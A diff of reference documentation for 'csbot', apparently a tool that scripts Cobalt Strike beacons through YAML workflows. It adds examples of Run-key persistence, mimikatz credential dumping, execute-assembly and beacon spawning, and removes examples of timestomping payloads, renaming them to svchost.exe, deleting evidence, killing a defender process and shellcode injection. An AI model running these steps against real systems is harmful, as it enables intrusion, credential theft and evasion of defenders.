@@ -6,10 +6,6 @@ Complete reference for creating csbot workflow templates.
 
 - [Workflow Structure](#workflow-structure)
 - [Action Types](#action-types)
-  - [Built-in Actions](#built-in-actions)
-  - [File & Directory Actions](#file--directory-actions)
-  - [Process Management Actions](#process-management-actions)
-  - [BOF Actions](#bof-actions)
 - [Conditions](#conditions)
 - [Beacon Metadata](#beacon-metadata)
 - [Success/Failure Handlers](#successfailure-handlers)
@@ -38,8 +34,47 @@ actions:                         # Required: List of actions to execute
 
 - **name**: Workflow identifier (shown in logs)
 - **beacon_id**: Target beacon ID. If omitted, bot prompts for interactive selection
+- **variables**: Optional key-value map of workflow variables for interpolation
 - **parallel**: Execute all top-level actions concurrently (use with caution)
 - **actions**: Ordered list of actions to execute
+
+### Variables
+
+Define reusable values at the workflow level that can be referenced in any action parameter:
+
+```yaml
+name: Example Workflow
+variables:
+  target_user: "bill"
+  payload_path: "C:\\Windows\\Temp\\payload.exe"
+  audit_dir: "C:\\FolderA"
+  persistence_name: "MyUpdate"
+
+actions:
+  - name: use_variables
+    type: shell
+    parameters:
+      command: 'echo ${payload_path}'
+
+  - name: persistence
+    type: shell
+    parameters:
+      command: 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}" /t REG_EXPAND_SZ /f /d "${payload_path}"'
+```
+
+**Variable Notes:**
+- Variables are available to all actions via `${variable_name}` syntax
+- Variables cannot start with `beacon.` (reserved for beacon metadata)
+- Variables are interpolated before action execution
+- Action outputs with the same name will override variables
+- Use backslash escaping in paths: `C:\\Windows\\System32`
+
+**Loading Order:**
+1. Workflow variables (from `variables:` section)
+2. Beacon metadata (from beacon API, prefixed with `beacon.`)
+3. Action outputs (from executed actions)
+
+Later values override earlier ones if names conflict.
 
 ## Action Types
 
@@ -130,6 +165,63 @@ Capture screenshot from beacon.
 
 **Output**: Screenshot status (image saved to CS downloads folder)
 
+#### consolecommand
+
+Execute any Cobalt Strike console command (including server-side aliases like execute-assembly, mimikatz, etc.).
+
+```yaml
+# Simple command
+- name: check_processes
+  type: consolecommand
+  parameters:
+    command: "ps"  # Required: Console command
+
+# Command with arguments
+- name: run_mimikatz
+  type: consolecommand
+  parameters:
+    command: "mimikatz"
+    arguments: "privilege::debug sekurlsa::logonpasswords"
+
+# Command with @files references (inline base64 files)
+- name: execute_assembly
+  type: consolecommand
+  parameters:
+    command: "execute-assembly"
+    arguments: "@files/Seatbelt.exe -group=all"
+    files:
+      Seatbelt.exe: "TVqQAAMAAAAEAAAA..."  # base64 encoded file content
+
+# Command with @artifacts references (teamserver-stored files)
+- name: spawn_payload
+  type: consolecommand
+  parameters:
+    command: "spawn"
+    arguments: "@artifacts/beacon.exe"
+
+# With variable interpolation
+- name: execute_custom
+  type: consolecommand
+  parameters:
+    command: "${console_cmd}"
+    arguments: "${cmd_args}"
+```
+
+**Output**: Command output (varies by command)
+
+**Use Cases**:
+- Execute server-side aliases not directly exposed via REST API
+- Run custom aggressor script commands
+- Execute-assembly for .NET assemblies
+- Mimikatz via built-in alias
+- Any command available in CS console
+
+**Notes**:
+- `command` parameter is required
+- `arguments` supports @files/ and @artifacts/ references
+- `files` map provides base64 content for @files/ references
+- Variable interpolation works in all parameters
+
 #### sleep
 
 Pause workflow execution.
@@ -142,199 +234,6 @@ Pause workflow execution.
 ```
 
 **Output**: None
-
-### File & Directory Actions
-
-#### cd
-
-Change the beacon's current working directory.
-
-```yaml
-- name: change_dir
-  type: cd
-  parameters:
-    path: "C:\\Users\\Public"  # Required: Target directory path
-```
-
-**Output**: Confirmation of directory change
-
-#### ls
-
-List directory contents.
-
-```yaml
-- name: list_files
-  type: ls
-  parameters:
-    path: "C:\\Users"  # Optional: Directory to list (defaults to CWD)
-```
-
-**Output**: Directory listing
-
-#### pwd
-
-Print the beacon's current working directory.
-
-```yaml
-- name: where_am_i
-  type: pwd
-```
-
-**Output**: Current directory path
-
-#### mkdir
-
-Create a directory on the target.
-
-```yaml
-- name: create_dir
-  type: mkdir
-  parameters:
-    folder: "C:\\Temp\\exfil"  # Required: Directory to create
-```
-
-**Output**: Confirmation of directory creation
-
-#### cp
-
-Copy a file on the target.
-
-```yaml
-- name: backup_file
-  type: cp
-  parameters:
-    src: "C:\\Users\\admin\\doc.txt"     # Required: Source file path
-    dst: "C:\\Temp\\doc_backup.txt"      # Required: Destination file path
-```
-
-**Output**: Confirmation of file copy
-
-#### mv
-
-Move or rename a file on the target.
-
-```yaml
-- name: rename_file
-  type: mv
-  parameters:
-    source: "C:\\Temp\\payload.exe"       # Required: Source file path
-    destination: "C:\\Temp\\svchost.exe"  # Required: Destination file path
-```
-
-**Output**: Confirmation of file move
-
-#### rm
-
-Remove a file or folder on the target.
-
-```yaml
-- name: cleanup
-  type: rm
-  parameters:
-    path: "C:\\Temp\\evidence.txt"  # Required: File or folder to remove
-```
-
-**Output**: Confirmation of removal
-
-#### drives
-
-List available drives on the target.
-
-```yaml
-- name: enum_drives
-  type: drives
-```
-
-**Output**: List of available drives
-
-#### timestomp
-
-Copy file timestamps from a source file to a destination file (for OPSEC).
-
-```yaml
-- name: stomp_timestamps
-  type: timestomp
-  parameters:
-    source: "C:\\Windows\\System32\\cmd.exe"  # Required: File to copy timestamps FROM
-    destination: "C:\\Temp\\payload.exe"       # Required: File to apply timestamps TO
-```
-
-**Output**: Confirmation of timestamp modification
-
-### Process Management Actions
-
-#### ps
-
-List running processes on the target.
-
-```yaml
-- name: list_procs
-  type: ps
-```
-
-**Output**: Process listing (PID, name, user, etc.)
-
-#### kill
-
-Terminate a process by PID.
-
-```yaml
-- name: kill_defender
-  type: kill
-  parameters:
-    pid: 4832  # Required: Process ID to terminate
-```
-
-**Output**: Confirmation of process termination
-
-#### getprivs
-
-Enable all available privileges for the current token.
-
-```yaml
-- name: enable_privs
-  type: getprivs
-```
-
-**Output**: List of enabled privileges
-
-#### setenv
-
-Set an environment variable on the beacon.
-
-```yaml
-- name: set_var
-  type: setenv
-  parameters:
-    key: "TEMP"                    # Required: Variable name
-    value: "C:\\Users\\Public"     # Optional: Variable value
-```
-
-**Output**: Confirmation of environment variable set
-
-#### exit
-
-Tell the beacon to exit. Use with caution.
-
-```yaml
-- name: beacon_exit
-  type: exit
-```
-
-**Output**: None (beacon terminates)
-
-#### job_stop
-
-Stop an active job running on the beacon.
-
-```yaml
-- name: stop_keylogger
-  type: job_stop
-  parameters:
-    jid: 3  # Required: Job ID to stop
-```
-
-**Output**: Confirmation of job termination
 
 ### BOF Actions
 
@@ -385,37 +284,7 @@ Execute BOF with typed arguments (automatically packed by Cobalt Strike API).
         value: 100
 ```
 
-**Supported argument types:**
-
-| Type | API Type | Value | Description |
-|------|----------|-------|-------------|
-| `string` | `string` | ANSI string literal | Standard C-style char* argument |
-| `wstring` | `wstring` | UTF-16 string literal | Wide wchar_t*/LPCWSTR argument |
-| `int` | `int` | 32-bit integer | DWORD, int, ULONG, PID values |
-| `short` | `short` | 16-bit integer | WORD, short, port numbers |
-| `binary` | `binary` | Base64-encoded bytes | Raw binary data passed directly |
-| `binarypath` | `binary` | File path on disk | File read at runtime, base64-encoded, sent as binary |
-| `binarylen` | `int` | File path on disk | File size in bytes calculated at runtime, sent as int |
-
-**Meta-types**: `binarypath` and `binarylen` are csbot-specific types resolved at runtime. They are commonly paired when a BOF expects a binary blob and its length:
-
-```yaml
-- name: inject_shellcode
-  type: bof_pack
-  parameters:
-    bof: /opt/bofs/inject.o
-    entrypoint: go
-    arguments:
-      # Shellcode read from disk at runtime
-      - type: binarypath
-        value: /tmp/payload.bin
-      # Length auto-calculated from the same file
-      - type: binarylen
-        value: /tmp/payload.bin
-      # Target PID
-      - type: int
-        value: 5678
-```
+**Supported types**: `string`, `wstring`, `int`, `short`, `binary`
 
 #### bof_pack_custom
 
@@ -1000,13 +869,6 @@ Before execution, workflows are validated for:
 - Required fields (name, actions)
 - Valid action types
 - Required parameters for each action type
-- `cd`, `rm` require `path`
-- `mkdir` requires `folder`
-- `cp` requires `src` and `dst`
-- `mv`, `timestomp` require `source` and `destination`
-- `kill` requires `pid`
-- `setenv` requires `key`
-- `job_stop` requires `jid`
 - BOF file existence
 - Valid operators in conditions
 - Unique action names
